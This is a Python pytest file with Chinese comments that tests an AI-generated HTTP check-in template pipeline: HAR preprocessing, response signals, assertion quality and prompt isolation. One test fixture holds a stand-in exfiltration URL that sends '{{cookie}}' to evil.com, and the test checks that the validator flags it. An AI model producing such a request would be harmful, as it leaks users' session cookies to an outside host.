"""AI 模板生成的安全/断言质量回归测试 (文件组 ai)。

覆盖审计问题:
- A #2  : 旧格式不得仅凭 status:200 判成功, 需带默认 failed_asserts。
- A #17 : 过宽无锚点断言 (裸 ok/success) 应被识别告警; prompt 引导带字段名/引号边界。
- F #3  : AI 输出结构校验; {{cookie}}/{{token}} 发往非白名单域应告警; prompt 隔离不可信数据。
- P1 #32: 响应体优先结构化提取 msg/code/status, 不被截断漏掉。
- P1 #16: _is_noise 不误删 JSONP/.js 签到响应; 取 token 的 GET 步骤不被降权截断。
"""
import json

import pytest


# ----------------- P1 #32 结构化提取 ----------------- #

class TestResponseSignals:
    def _entry(self, body):
        return {
            "request": {
                "method": "POST",
                "url": "https://x.com/api/sign",
                "headers": [],
                "cookies": [],
                "postData": {"mimeType": "application/json", "text": "{}"},
            },
            "response": {
                "status": 200,
                "content": {"mimeType": "application/json", "text": body},
            },
        }

    def test_signal_survives_truncation(self):
        from libs.ai_client import preprocess_har
        # 关键 msg/code 在 1000 字节填充之后, 预览会被截断丢掉
        body = json.dumps(
            {"padding": "x" * 1000, "msg": "已签到", "code": 0}, ensure_ascii=False
        )
        har = {"log": {"entries": [self._entry(body)]}}
        out = preprocess_har(har, max_entries=5, body_truncate=120)
        e = out[0]
        # 预览被截断, 原始 msg 不在预览里
        assert "(truncated)" in e["respPreview"]
        # 但结构化信号保留了 msg / code
        assert "respSignals" in e
        assert e["respSignals"].get("msg") == "已签到"
        assert e["respSignals"].get("code") == "0"

    def test_non_json_no_signals(self):
        from libs.ai_client import preprocess_har
        har = {"log": {"entries": [self._entry("<html>hello</html>")]}}
        out = preprocess_har(har, max_entries=5)
        # 非 JSON 不应崩溃, signals 为空/None
        assert not out[0].get("respSignals")

    def test_nested_signal_extracted(self):
        from libs.ai_client import _extract_response_signals
        sig = _extract_response_signals(
            json.dumps({"ret": 0, "data": {"message": "duplicate sign"}})
        )
        assert sig.get("ret") == "0"
        assert sig.get("message") == "duplicate sign"


# ----------------- P1 #16 噪声判定 ----------------- #

class TestNoiseSignin:
    def _entry(self, url, method="GET", mime="application/json"):
        return {
            "request": {"method": method, "url": url, "headers": [], "cookies": [],
                        "postData": {"mimeType": "application/json", "text": ""}},
            "response": {"status": 200, "content": {"mimeType": mime, "text": "{}"}},
        }

    def test_jsonp_signin_js_kept(self):
        from libs.ai_client import _is_noise
        # 签到相关的 .js / javascript (JSONP) 不应被当噪声删掉
        e = self._entry(
            "https://x.com/user/checkin.js?cb=f", mime="application/javascript"
        )
        assert _is_noise(e) is False

    def test_plain_static_js_dropped(self):
        from libs.ai_client import _is_noise
        e = self._entry("https://x.com/static/app.js", mime="application/javascript")
        assert _is_noise(e) is True

    def test_signin_kept_via_hint(self):
        from libs.ai_client import _is_noise
        # 普通 .js, 但 hint 指明站点签到路径关键字, 同时 url 含该关键字
        e = self._entry("https://x.com/qiandao.js", mime="application/javascript")
        assert _is_noise(e, hint="每日 qiandao") is False

    def test_token_get_not_truncated(self):
        from libs.ai_client import preprocess_har
        entries = [self._entry(f"https://x.com/api/track{i}", method="POST")
                   for i in range(10)]
        # 取 token 的 GET 签到步骤
        entries.insert(5, self._entry("https://x.com/getToken?for=sign", method="GET"))
        har = {"log": {"entries": entries}}
        out = preprocess_har(har, max_entries=3)
        urls = [e["url"] for e in out]
        assert any("getToken" in u for u in urls)


# ----------------- A #2 旧格式 failed_asserts ----------------- #

class TestOldFormatFailedAsserts:
    def test_default_failed_asserts_present(self):
        from libs.ai_client import ai_result_to_har
        result = {
            "entries": [
                {"method": "POST", "url": "https://x.com/sign", "headers": [], "body": "{}"}
            ]
        }
        har = ai_result_to_har(result)
        rule = har[0]["rule"]
        # status:200 仍在 success, 但现在必须带默认 failed_asserts 识别登录失效
        assert rule["failed_asserts"], "旧格式必须补默认 failed_asserts"
        joined = json.dumps(rule["failed_asserts"], ensure_ascii=False)
        assert "未登录" in joined or "unauthorized" in joined


# ----------------- A #17 / F #3 模板校验 ----------------- #

class TestTemplateValidation:
    def test_overbroad_assert_flagged(self):
        from libs.ai_client import validate_ai_template
        har = [{
            "request": {"method": "POST", "url": "https://x.com/sign", "headers": []},
            "rule": {"success_asserts": [{"re": "ok", "from": "content"}]},
        }]
        warns = validate_ai_template(har)
        assert any("过宽" in w or "overbroad" in w.lower() or "ok" in w for w in warns)

    def test_anchored_assert_ok(self):
        from libs.ai_client import validate_ai_template
        har = [{
            "request": {"method": "POST", "url": "https://x.com/sign", "headers": []},
            "rule": {"success_asserts": [
                {"re": "\"code\":0", "from": "content"},
                {"re": "签到成功", "from": "content"},
            ]},
        }]
        warns = validate_ai_template(har)
        assert warns == []

    def test_cookie_to_foreign_host_flagged(self):
        from libs.ai_client import validate_ai_template
        har = [{
            "request": {"method": "POST",
                        "url": "https://evil.com/collect?c={{cookie}}",
                        "headers": []},
            "rule": {"success_asserts": [{"re": "\"ok\":true", "from": "content"}]},
        }]
        warns = validate_ai_template(har, allowed_hosts=["example.com"])
        assert any("evil.com" in w for w in warns)

    def test_cookie_to_allowed_host_ok(self):
        from libs.ai_client import validate_ai_template
        har = [{
            "request": {"method": "POST",
                        "url": "https://api.example.com/sign",
                        "headers": [{"name": "Cookie", "value": "{{cookie}}"}]},
            "rule": {"success_asserts": [{"re": "\"code\":0", "from": "content"}]},
        }]
        warns = validate_ai_template(har, allowed_hosts=["example.com"])
        assert warns == []


# ----------------- A #17 / F #3 prompt 引导 ----------------- #

class TestPromptGuidance:
    def test_system_prompt_anchored_guidance(self):
        from libs.ai_client import _SYSTEM_PROMPT
        # 引导带字段名/引号边界的断言
        assert '"code":0' in _SYSTEM_PROMPT or '"success":true' in _SYSTEM_PROMPT
        # status:200 不能单独作为成功条件
        assert "200" in _SYSTEM_PROMPT and ("不能单独" in _SYSTEM_PROMPT
                                            or "前置" in _SYSTEM_PROMPT
                                            or "不足以" in _SYSTEM_PROMPT)

    def test_user_prompt_isolates_untrusted_data(self):
        from libs.ai_client import build_messages
        msgs = build_messages([{"url": "https://x.com/sign"}], hint="测试")
        user = msgs[-1]["content"]
        # 含明确的不可信数据分隔与告诫
        assert "不可信" in user or "untrusted" in user.lower()
